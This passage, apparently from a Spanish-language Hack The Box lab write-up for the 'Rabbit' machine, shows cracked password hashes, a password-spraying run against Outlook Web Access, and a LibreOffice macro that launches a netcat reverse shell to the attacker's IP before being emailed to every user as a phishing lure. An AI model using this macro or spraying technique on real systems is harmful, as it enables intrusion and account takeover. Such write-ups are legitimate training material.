| a6f30815a43f38ec6de95b9a9d74da37 (santiago)      | Moebius  |
| b9c2538d92362e0e18e52d0ee9ca0c6f (pussycatdolls) | Ariel    |
| d322dc36451587ea2994c84c9d9717a1                 | Turel    |
| d459f76a5eeeed0eca8ab4476c144ac4                 | Dimitri  |
| dea56e47f1c62c30b83b70eb281a6c39 (barcelona)     | Malek    |
+--------------------------------------------------+----------+
```

De todos los hashes, se han crackeado automáticamente unos pocos. El resto las extraje de [Crackstation]

<img src="/writeups/assets/img/Rabbit-htb/12.png" alt="">

Las pruebo a bruteforcear contra el OWA con ```atomizer.py```, pero no funciona

```null
python3 atomizer.py owa 'https://rabbit/owa/auth/logon.aspx?url=https://rabbit/owa/&reason=0' passwords users
[*] Using 'https://rabbit/owa/auth/logon.aspx?url=https://rabbit/owa/&reason=0' as URL
[-] Error parsing internal domain name using OWA. This usually means OWA is being hosted on-prem or the target has a hybrid AD deployment
    Do some recon and pass the custom OWA URL as the target if you really want the internal domain name, password spraying can still continue though :)

    Full error: cannot access local variable 'ntlm_info' where it is not associated with a value

[*] Starting spray at 2023-03-14 18:03:07 UTC
[+] Found credentials: Zephon:passwords
[+] Found credentials: Kain:passwords
[+] Found credentials: Magnus:passwords
[+] Found credentials: Raziel:passwords
[+] Found credentials: Dimitri:passwords
[+] Found credentials: Turel:passwords
[+] Dumped 6 valid accounts to owa_valid_accounts.txt
```

Son válidas para ```Ariel:pussycatdolls```

<img src="/writeups/assets/img/Rabbit-htb/13.png" alt="">

Hay varios correos del usuario Administrador

<img src="/writeups/assets/img/Rabbit-htb/14.png" alt="">

<img src="/writeups/assets/img/Rabbit-htb/15.png" alt="">

<img src="/writeups/assets/img/Rabbit-htb/16.png" alt="">

Está solicitando un archivo TLS. Creo uno con una macro con ```LibreOffice```

<img src="/writeups/assets/img/Rabbit-htb/17.png" alt="">

```null
REM  *****  BASIC  *****

Sub Onload
	shell("cmd /c \\10.10.16.11\shared\nc.exe -e cmd 10.10.16.11 443");

End Sub
```

Envío el correo a todos los usuarios

<img src="/writeups/assets/img/Rabbit-htb/18.png" alt="">

